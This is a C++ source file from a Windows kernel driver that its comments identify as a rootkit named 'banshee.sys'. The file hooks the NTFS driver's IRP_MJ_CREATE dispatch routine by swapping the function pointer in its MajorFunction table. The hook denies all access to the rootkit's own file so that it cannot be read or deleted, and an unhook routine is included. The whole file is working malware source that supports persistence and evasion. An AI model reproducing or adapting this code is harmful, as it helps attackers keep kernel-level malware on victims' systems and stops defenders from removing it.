#pragma once

#include <ntifs.h>
#include <wdf.h>
#include <ntddk.h>
#include "Globals.hpp"
#include "Misc.hpp"
#include "WinTypes.hpp"

// https://github.com/Idov31/Nidhogg/blob/d9f3b0366aad55ef6dc815361d5ec0943cd378d9/Nidhogg/WindowsTypes.hpp#L250
extern "C" POBJECT_TYPE *IoDriverObjectType;

PWCH 
BeGetFilenameFromPath(PWCH fullPath) 
{
    // Find the last occurrence of backslash in the full path
    PWCH lastSlash = nullptr;
    PWCH current = fullPath;
    while (*current != L'\0') 
    {
        if (*current == L'\\') 
        {
            lastSlash = current;
        }
        current++;
    }

    // If a backslash is found, return the pointer to the character after the backslash
    if (lastSlash != nullptr) 
    {
        return lastSlash + 1;
    }
    else 
    {
        // Otherwise, return the original pointer (assuming fullPath points to the filename itself)
        return fullPath;
    }
}

NTSTATUS 
BeHooked_NTFS_IRP_MJ_CREATE(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    PIO_STACK_LOCATION pIoStackIrp = IoGetCurrentIrpStackLocation(Irp);

    // Get filename of file that will be accessed
    PWCH fullPath = pIoStackIrp->FileObject->FileName.Buffer;

    // If the file that will be accessed is our rootkit driver, deny access to the file
    // This doesnt hide the file, but protects it from deletion or read access
    if (!BeIsStringNull(fullPath) &&
        (_strcmpi_w(L"banshee.sys", BeGetFilenameFromPath(fullPath)) == 0))
    {
        LOG_MSG("Filename: %ws\n", fullPath);
        Irp->IoStatus.Status = STATUS_ACCESS_DENIED;
        return STATUS_SUCCESS;
    }

    // else call the original function
    return BeGlobals::originalNTFS_IRP_MJ_CREATE_function(DeviceObject, Irp);
}

NTSTATUS 
BeGetNtfsDriverObject(OUT PDRIVER_OBJECT* ntfsDriverObject)
{
    NTSTATUS status;
    UNICODE_STRING ntfsDriverName = RTL_CONSTANT_STRING(L"\\FileSystem\\NTFS");
    OBJECT_ATTRIBUTES objectAttributes;

    InitializeObjectAttributes(&objectAttributes, &ntfsDriverName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // Get a pointer to the driver object representing the NTFS driver
    status = BeGlobals::pObReferenceObjectByName(&ntfsDriverName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, (PVOID*)ntfsDriverObject);
    if (status != 0)
    {
        return status;
    }

    return STATUS_SUCCESS;
}


NTSTATUS
BeHookNTFSFileCreate()
{
    PDRIVER_OBJECT ntfsDriverObject;
    NTSTATUS NtStatus = BeGetNtfsDriverObject(&ntfsDriverObject);

	if (NtStatus != 0) 
    {
		LOG_MSG("Failed to get ntfs driver object, (0x%08X)\n", NtStatus);
		return NtStatus;
	}

    // Get the MJ_CREATE function of the ntfs driver and save it to the global variable
    // Also put our function as the IRP_MJ_CREATE handler instead
    BeGlobals::originalNTFS_IRP_MJ_CREATE_function = (NTFS_IRP_MJ_CREATE_FUNCTION)InterlockedExchange64((LONG64*)&ntfsDriverObject->MajorFunction[IRP_MJ_CREATE], (LONG64)BeHooked_NTFS_IRP_MJ_CREATE);

	ObDereferenceObject(ntfsDriverObject);
	return STATUS_SUCCESS;
}

NTSTATUS
BeUnhookNTFSFileCreate()
{
    PDRIVER_OBJECT ntfsDriverObject;
    NTSTATUS NtStatus = BeGetNtfsDriverObject(&ntfsDriverObject);

    if (NtStatus != 0)
    {
        LOG_MSG("Failed to get ntfs driver object, (0x%08X)\n", NtStatus);
        return NtStatus;
    }

    // Restore the original address
    InterlockedExchange64((LONG64*)&ntfsDriverObject->MajorFunction[IRP_MJ_CREATE], (LONG64)BeGlobals::originalNTFS_IRP_MJ_CREATE_function);

    ObDereferenceObject(ntfsDriverObject);
    return STATUS_SUCCESS;
}